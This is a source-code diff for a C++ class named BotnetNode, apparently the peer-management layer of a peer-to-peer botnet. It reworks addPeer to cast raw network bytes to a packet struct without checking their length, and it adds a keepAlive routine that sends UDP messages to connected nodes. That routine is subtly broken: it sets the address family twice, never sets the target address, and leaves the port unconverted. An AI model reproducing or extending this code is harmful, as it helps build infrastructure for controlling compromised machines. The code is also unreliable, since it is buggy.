@@ -52,26 +52,28 @@ void BotnetNode::sendNetTree(
 }
 
 void BotnetNode::addPeer(
-	const struct botnet_pack& pack, 
+	const u_char* data,
 	const SOCKET& udp_sock
 )
 {
 	/* locals */
+
 	char buffer[1024];
 	std::vector<adr> hosts;
 	struct sockaddr_in peer_addr;
+	const struct botnet_pack* pack = (struct botnet_pack*)data;
 
-	if (!findNode({ pack.dst_peer.ip, pack.dst_peer.port }, hosts))
+	if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts))
 	{
 		/* create sockaddr_in struct */
 		peer_addr.sin_family = AF_INET;
-		peer_addr.sin_port = htons(pack.dst_peer.port);
-		peer_addr.sin_addr.s_addr = htonl(pack.dst_peer.ip);
+		peer_addr.sin_port = htons(pack->dst_peer.port);
+		peer_addr.sin_addr.s_addr = htonl(pack->dst_peer.ip);
 
 		hosts.clear();
 		sendNetTree(udp_sock, peer_addr, hosts, buffer);
 
-		_branches.push_back(new BotnetNode(pack.dst_peer.ip, pack.dst_peer.port));
+		_branches.push_back(new BotnetNode(pack->dst_peer.ip, pack->dst_peer.port));
 	}
 }
 
@@ -129,4 +131,22 @@ void BotnetNode::handleSync(
 				base_node->_branches.push_back(sub_node) :
 				base_node->_branches.push_back(new BotnetNode(addr.ip, addr.port));
 		}
+}
+
+void BotnetNode::keepAlive(
+	const SOCKET& udp_sock
+)
+{
+	const char msg[10] = "keep";
+	struct sockaddr_in addr;
+
+	for (BotnetNode* node : _branches)
+	{
+		/* create sockaddr_in struct */
+		addr.sin_family = AF_INET;
+		addr.sin_port = node->_adr.port;
+		addr.sin_family = node->_adr.ip;
+
+		sendto(udp_sock, msg, 10, 0, (struct sockaddr*)&addr, sizeof(addr));
+	}
 }
